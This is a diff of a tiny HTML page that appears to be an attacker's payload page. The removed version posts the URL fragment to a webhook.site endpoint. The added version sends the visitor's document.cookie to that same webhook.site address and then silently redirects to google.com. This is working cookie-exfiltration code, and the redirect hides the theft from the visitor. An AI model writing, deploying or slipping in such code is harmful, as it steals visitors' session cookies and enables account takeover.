@@ -1,19 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>asdasdasd</title>
+    <title>Version 8</title>
 </head>
 <body>
-    <h1>VERSION 7</h1>
     <script>
-        const data = window.location.hash.substring(1); 
-        if (data) {
-            fetch('https://webhook.site/f274ce66-95a3-43e4-8fd0-58833dbce475', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: decodeURIComponent(data)
-            });
-        }
+        var webhookUrl = 'https://webhook.site/f274ce66-95a3-43e4-8fd0-58833dbce475';
+        fetch(webhookUrl + '?cookie=' + document.cookie);
+        window.location.href = "https://google.com";
     </script>
 </body>
 </html>
